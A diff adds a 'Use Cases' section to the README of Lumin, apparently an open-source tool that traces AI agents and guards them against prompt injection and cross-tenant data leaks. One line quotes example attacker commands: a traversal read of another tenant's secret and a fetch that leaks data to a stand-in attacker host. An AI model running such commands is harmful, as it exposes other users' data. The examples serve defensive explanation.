@@ -7,6 +7,9 @@
       <a href="#-quickstart">
          <strong>Quickstart</strong>
       </a> ·
+      <a href="#-use-cases">
+         <strong>Use Cases</strong>
+      </a> ·
       <a href="#%EF%B8%8F-four-pillars--observe-govern-defend-operate">
          <strong>Four Pillars</strong>
       </a> ·
@@ -68,6 +71,63 @@
 <p align="center">
    <sub>▶ <a href="https://youtu.be/hgTntZniuv4">Watch the full 52-second walkthrough on YouTube</a> — instrumenting an agent, inspecting a trace, promoting a shadow policy, and watching the firewall block a live cross-session leak.</sub>
 </p>
+
+---
+
+## 🎯 Use Cases
+
+Lumin is the operational backbone for four kinds of teams. Find yourself below.
+
+### 1. You're building an AI product and your agent is a black box
+
+You shipped a LangChain / CrewAI / Anthropic-based agent. It works most of the time. When it doesn't, you can't tell whether the LLM hallucinated, a tool returned garbage, the retriever missed, or your prompt template silently dropped a variable. Production users hit issues you can't reproduce.
+
+**What Lumin gives you:**
+- Add `@lumin.trace` (or set `LUMIN_TRACING=true` for LangChain) and every LLM call, tool invocation, retrieval, embedding, and custom span lands in a local dashboard within ~50ms.
+- Cost + token attribution per call — see which step in your chain burns the budget.
+- Multi-turn session view — group related traces into one conversation.
+- Real-time WebSocket stream — watch traces land while a user is mid-conversation.
+- All local. Your traces stay on your machine. No SaaS bill, no data leaving.
+
+**Replaces / sits next to:** Langfuse, LangSmith, Helicone, Arize Phoenix.
+
+### 2. You ship a multi-tenant bot (Slack, Telegram, Discord, internal SaaS)
+
+One assistant, many users. User A asks the bot to remember their customer notes. User B asks the same bot a different question. The LLM has read both messages and might recite A's notes to B — **the canonical cross-session leak**. No amount of "be careful, model" in the system prompt prevents this structurally.
+
+**What Lumin gives you:**
+- **L1 storage sandbox** — every fs tool call gets its path rewritten to `_lumin/by-sender/<senderId>/`. The bot literally has no path to another tenant's data.
+- **L1.5 deny-by-default for shells + network egress** — an attacker can't `exec("cat ../alice/secret")` or `web_fetch("https://attacker.com?leak=...")`.
+- **L2 conversation history reset** — when the active sender changes, the LLM's prior-tenant context is wiped before the next turn.
+- **L3 Presidio NER + structural prompt redaction** — foreign tenant names, emails, IDs scrubbed before they reach the model.
+- **L4 audit trail** — every block, redaction, sandbox rewrite goes to `/violations`. Webhooks to PagerDuty / Slack / SIEM.
+
+**Verified live:** Telegram → Slack leak attempt blocked across all five layers in the demo video above. **No other open-source tool does this.**
+
+### 3. You need OWASP LLM Top 10 compliance for security review
+
+Security is asking for a written answer to *"what stops the agent from leaking PII / being prompt-injected / writing to a forbidden path / using too many tokens / running a shell command?"* before the agent ships to prod. You don't want a 6-month custom build.
+
+**What Lumin gives you:**
+- **12 starter policy packs** ship preloaded: OWASP LLM Top 10, OWASP Agentic 2025, GDPR, HIPAA, PCI-DSS, cost guards, cross-session isolation, framework-specific (LangGraph, Mastra), code-assistant, dev-environment safety, destructive-shell, sensitive-file-reads.
+- **8 detection methods** layered: Presidio NER, Prompt Guard 2, Llama Guard 4, LLM-judge, embedding similarity, indirect-prompt-injection, locally-trainable classifier, regex packs.
+- **Policy lifecycle** — every rule ships in `shadow` mode (records but never blocks). Promote individually to `enforce` after reviewing the timeline. Full versioning + rollback + audit log.
+- **Approvals queue** — anything outside the rules pauses until a human signs off in the dashboard.
+- **Audit-ready** — every decision recorded, every block timestamped, every redaction logged. Tamper-evident.
+
+**Replaces / sits next to:** Lakera, NemoGuardrails, Agentic Radar — but unlike them, runs in your VPC and is one Docker container.
+
+### 4. You're already on Langfuse / LangSmith and want to bring traces back in-house
+
+Your traces have customer data. SOC review is asking why production conversations are routed to a third-party SaaS. Or your bill is becoming material.
+
+**What Lumin gives you:**
+- **OTLP receiver** at `POST /v1/otlp/v1/traces` — point any OTel-instrumented agent at Lumin without touching code.
+- **OpenAI-compatible HTTP proxy** at `POST /v1/openai/*` — point any OpenAI/Ollama/Anthropic-compat client at Lumin instead. Captures every request, response, tokens, cost — no SDK changes.
+- **Wire-format compatibility** — Lumin's span shape mirrors what Langfuse / LangSmith / Logfire / Phoenix produce, so dashboards translate without remapping.
+- **Drop the SaaS dependency entirely** — single Docker container, your DuckDB on your disk, no external services.
+
+**Replaces:** the cloud version of Langfuse / LangSmith / Helicone — same observability, on your hardware.
 
 ---
 
